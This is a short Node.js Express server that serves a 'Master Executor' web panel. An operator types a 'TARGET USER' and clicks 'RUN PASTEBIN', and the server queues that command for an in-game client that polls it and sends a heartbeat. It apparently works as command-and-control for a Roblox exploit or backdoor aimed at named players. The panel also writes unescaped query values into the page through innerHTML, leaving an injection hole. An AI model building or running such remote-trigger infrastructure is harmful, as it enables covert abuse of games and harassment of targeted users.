const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

let commandQueue = [];
let logs = [];
let lastCheckIn = "Never";

function addLog(msg) {
    logs.unshift(`[${new Date().toLocaleTimeString()}] ${msg}`);
    if (logs.length > 20) logs.pop();
}

app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Master Executor</title>
            <style>
                body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; padding: 20px; }
                .status-bar { border: 1px solid #00ff41; padding: 10px; width: 450px; margin-bottom: 20px; text-align: center; }
                input { background: #000; border: 1px dashed #00ff41; color: #00ff41; padding: 10px; text-align: center; margin-bottom: 20px; }
                .btn-group { display: flex; gap: 15px; }
                .btn { border: 1px solid #00ff41; padding: 15px; cursor: pointer; font-weight: bold; }
                .btn:hover { background: #003b11; box-shadow: 0 0 10px #00ff41; }
                .logs { width: 100%; max-width: 600px; height: 300px; border: 1px solid #333; margin-top: 20px; padding: 10px; font-size: 12px; overflow-y: auto; background: #000; }
            </style>
        </head>
        <body>
            <div class="status-bar">
                STATUS: <span id="status">OFFLINE</span> | LAST HB: <span id="hb">None</span>
            </div>

            TARGET USER: <input type="text" id="userInput" placeholder="Username Here">

            <div class="btn-group">
                <div class="btn" onclick="send('Test1')">RUN PASTEBIN</div>
                <div class="btn" onclick="send('TestGUI')">TEST CONNECTION</div>
            </div>

            <div id="logs" class="logs">Waiting for logs...</div>

            <script>
                function send(id) {
                    const user = document.getElementById('userInput').value;
                    if (!user || user === "") {
                        alert("Enter a username first!");
                        return;
                    }
                    // This sends the ID and the TARGET to the server
                    fetch(\`/send?id=\${id}&target=\${user}\`);
                }

                setInterval(() => {
                    fetch('/getLogs').then(r => r.json()).then(data => {
                        document.getElementById('hb').innerText = data.lastCheck;
                        document.getElementById('status').innerText = "ONLINE";
                        document.getElementById('logs').innerHTML = data.logs.map(l => \`<div>\${l}</div>\`).join('');
                    }).catch(() => document.getElementById('status').innerText = "OFFLINE");
                }, 2000);
            </script>
        </body>
        </html>
    `);
});

app.get('/send', (req, res) => {
    const { id, target } = req.query;
    commandQueue.push({ id, target });
    addLog(`WEB: Queued ${id} for ${target}`);
    res.send("OK");
});

app.get('/getCommand', (req, res) => {
    lastCheckIn = new Date().toLocaleTimeString();
    if (commandQueue.length > 0) {
        const c = commandQueue.shift();
        addLog(`RBX: Sent ${c.id} to game`);
        res.json(c);
    } else {
        res.json({ id: null });
    }
});

app.get('/getLogs', (req, res) => res.json({ logs, lastCheck: lastCheckIn }));
app.listen(PORT, () => console.log("Web Server Live"));
